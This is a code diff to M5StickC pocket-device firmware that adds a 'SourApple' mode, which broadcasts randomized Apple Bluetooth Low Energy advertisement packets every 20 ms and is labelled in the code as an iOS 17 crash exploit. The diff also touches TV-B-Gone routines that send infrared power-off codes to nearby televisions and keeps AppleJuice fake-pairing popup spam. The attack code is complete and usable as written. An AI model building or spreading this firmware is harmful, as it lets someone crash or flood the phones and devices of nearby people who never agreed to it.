@@ -36,7 +36,9 @@ String timeStamp;
 int cursor = 0;
 int rotation = 1;
 int brightness = 100;
-bool rstOverride = false;
+int ajDelay = 1000;
+bool rstOverride = false; // Reset Button Override. Set to true when navigating menus.
+bool sourApple = false;   // Internal flag to place AppleJuice into SourApple iOS17 Exploit Mode
 #define EEPROM_SIZE 4
 
 struct MENU {
@@ -96,6 +98,16 @@ void screen_dim_proc() {
       M5.Axp.ScreenBreath(10);
       screen_dim_dimmed = true;
     }
+  }
+}
+
+// Tap the power button from pretty much anywhere to get to the main menu
+void check_axp_press() {
+  if (M5.Axp.GetBtnPress()) {
+    isSwitching = true;
+    rstOverride = false;
+    current_proc = 1;
+    delay(100);
   }
 }
 
@@ -426,6 +438,81 @@ void tvbgmenu_loop() {
   }
 }
 
+void sendAllCodes()
+{
+  bool endingEarly = false; //will be set to true if the user presses the button during code-sending
+  if (region == NA) {
+    num_codes = num_NAcodes;
+  } else {
+    num_codes = num_EUcodes;
+  }
+  for (i = 0 ; i < num_codes; i++)
+  {
+    if (region == NA) {
+      powerCode = NApowerCodes[i];
+    }
+    else {
+      powerCode = EUpowerCodes[i];
+    }
+    const uint8_t freq = powerCode->timer_val;
+    const uint8_t numpairs = powerCode->numpairs;
+    M5.Lcd.fillScreen(BLACK);
+    M5.Lcd.setTextSize(4);
+    M5.Lcd.setCursor(5, 1);
+    M5.Lcd.println("TV-B-Gone");
+    M5.Lcd.setTextSize(2);
+    M5.Lcd.println("Front Key: Go/Pause");
+    const uint8_t bitcompression = powerCode->bitcompression;
+    code_ptr = 0;
+    for (uint8_t k = 0; k < numpairs; k++) {
+      uint16_t ti;
+      ti = (read_bits(bitcompression)) * 2;
+      offtime = powerCode->times[ti];  // read word 1 - ontime
+      ontime = powerCode->times[ti + 1]; // read word 2 - offtime
+      M5.Lcd.setTextSize(1);
+      M5.Lcd.printf("rti = %d Pair = %d, %d\n", ti >> 1, ontime, offtime);
+      rawData[k * 2] = offtime * 10;
+      rawData[(k * 2) + 1] = ontime * 10;
+      yield();
+    }
+    irsend.sendRaw(rawData, (numpairs * 2) , freq);
+    // Hack: Set IRLED high to turn it off after each burst. Otherwise it stays on (active low)
+    digitalWrite(IRLED, HIGH);
+    yield();
+    bitsleft_r = 0;
+    delay_ten_us(20500);
+    if (M5.Axp.GetBtnPress()){
+      // duplicate code here, sadly, since this is a blocking loop
+      endingEarly = true;
+      current_proc = 1;
+      isSwitching = true;
+      rstOverride = false; 
+      break;     
+    }
+    if (digitalRead(TRIGGER) == BUTTON_PRESSED){
+      while (digitalRead(TRIGGER) == BUTTON_PRESSED) {
+        yield();
+      }
+      endingEarly = true;
+      quickflashLEDx(4);
+      break; 
+    }
+  } 
+  if (endingEarly == false)
+  {
+    delay_ten_us(MAX_WAIT_TIME); // wait 655.350ms
+    delay_ten_us(MAX_WAIT_TIME); // wait 655.350ms
+    quickflashLEDx(8);
+  }
+  M5.Lcd.fillScreen(BLACK);
+  M5.Lcd.setTextSize(4);
+  M5.Lcd.setCursor(5, 1);
+  M5.Lcd.println("TV-B-Gone");
+  M5.Lcd.setTextSize(2);
+  M5.Lcd.println("Front Key: Go/Pause");
+  M5.Lcd.println("Side Key: Exit");
+}
+
 
 /// CLOCK ///
 void clock_setup() {
@@ -516,6 +603,8 @@ void timeset_loop() {
 /// AppleJuice ///
 MENU ajmenu[] = {
   { "AirPods", 1},
+  { "SourApple Crash", 29},
+  { "Transfer Number", 27},
   { "AirPods Pro", 2},
   { "AirPods Max", 3},
   { "AirPods G2", 4},
@@ -541,9 +630,8 @@ MENU ajmenu[] = {
   { "AppleTV Keyboard", 24},
   { "AppleTV Network", 25},
   { "TV Color Balance", 26},
-  { "Transfer Number", 27},
   { "Setup New Phone", 28},
-  { "back", 29},
+  { "back", 30},
 };
 
 void aj_drawmenu() {
@@ -573,6 +661,7 @@ void aj_setup(){
   M5.Lcd.println("AppleJuice");
   delay(1000);  
   cursor = 0;
+  sourApple = false;
   rstOverride = true;
   aj_drawmenu();
 }
@@ -674,6 +763,9 @@ void aj_loop(){
         data = SetupNewPhone;
         break;
       case 29:
+        sourApple = true;
+        break;
+      case 30:
         rstOverride = false;
         isSwitching = true;
         current_proc = 1;
@@ -704,19 +796,49 @@ void aj_adv(){
   // Isolating this to its own process lets us take advantage 
   // of the background stuff easier (menu button, dimmer, etc)
   rstOverride = true;
-  M5.Rtc.GetBm8563Time();
-  if (M5.Rtc.Second != advtime){
-    advtime = M5.Rtc.Second;
+  if (sourApple){
+    delay(20);   // 20msec delay instead of ajDelay for SourApple attack
+    advtime = 0; // bypass ajDelay counter
+  }
+  if (millis() > advtime + ajDelay){
+    advtime = millis();
     pAdvertising->stop(); // This is placed here mostly for timing.
                           // It allows the BLE beacon to run through the loop.
     BLEAdvertisementData oAdvertisementData = BLEAdvertisementData();
-    // sizeof() has to match the 31 and 23 byte char* however it doesn't seem
-    // to work with bare integers, so sizeof() calls arbitrary elements of the
-    // correct length. Without this if block, only 31-byte messages worked.
-    if (deviceType >= 18){
-      oAdvertisementData.addData(std::string((char*)data, sizeof(AppleTVPair)));
+    if (sourApple){
+      // Some code borrowed from RapierXbox/ESP32-Sour-Apple
+      // Original credits for algorithm ECTO-1A & WillyJL
+      uint8_t packet[17];
+      uint8_t size = 17;
+      uint8_t i = 0;
+      packet[i++] = size - 1;    // Packet Length
+      packet[i++] = 0xFF;        // Packet Type (Manufacturer Specific)
+      packet[i++] = 0x4C;        // Packet Company ID (Apple, Inc.)
+      packet[i++] = 0x00;        // ...
+      packet[i++] = 0x0F;  // Type
+      packet[i++] = 0x05;                        // Length
+      packet[i++] = 0xC1;                        // Action Flags
+      const uint8_t types[] = { 0x27, 0x09, 0x02, 0x1e, 0x2b, 0x2d, 0x2f, 0x01, 0x06, 0x20, 0xc0 };
+      packet[i++] = types[rand() % sizeof(types)];  // Action Type
+      esp_fill_random(&packet[i], 3); // Authentication Tag
+      i += 3;
+      packet[i++] = 0x00;  // ???
+      packet[i++] = 0x00;  // ???
+      packet[i++] =  0x10;  // Type ???
+      esp_fill_random(&packet[i], 3);
+      oAdvertisementData.addData(std::string((char *)packet, 17));
     } else {
-      oAdvertisementData.addData(std::string((char*)data, sizeof(Airpods)));
+      // TODO: use esp_fill_random to populate last 3 chars in data 
+      // payload for other appleJuice spam types to randomize device ID?
+      // 
+      // sizeof() has to match the 31 and 23 byte char* however it doesn't seem
+      // to work with bare integers, so sizeof() calls arbitrary elements of the
+      // correct length. Without this if block, only 31-byte messages worked.
+      if (deviceType >= 18){
+        oAdvertisementData.addData(std::string((char*)data, sizeof(AppleTVPair)));
+      } else {
+        oAdvertisementData.addData(std::string((char*)data, sizeof(Airpods)));
+      }
     }
     pAdvertising->setAdvertisementData(oAdvertisementData);
     pAdvertising->start();
@@ -725,8 +847,10 @@ void aj_adv(){
     digitalWrite(M5_LED, HIGH); //LED OFF on Stick C Plus
   }
   if (digitalRead(M5_BUTTON_RST) == LOW) {
-    current_proc = 8;    
+    current_proc = 8;
+    sourApple = false;
     pAdvertising->stop(); // Bug that keeps advertising in the background. Oops.
+    aj_drawmenu();
     delay(250);
   }
 }
@@ -967,7 +1091,8 @@ void loop() {
   // Background processes
   switcher_button_proc();
   screen_dim_proc();
-
+  check_axp_press();
+  
   // Switcher
   if (isSwitching) {
     isSwitching = false;
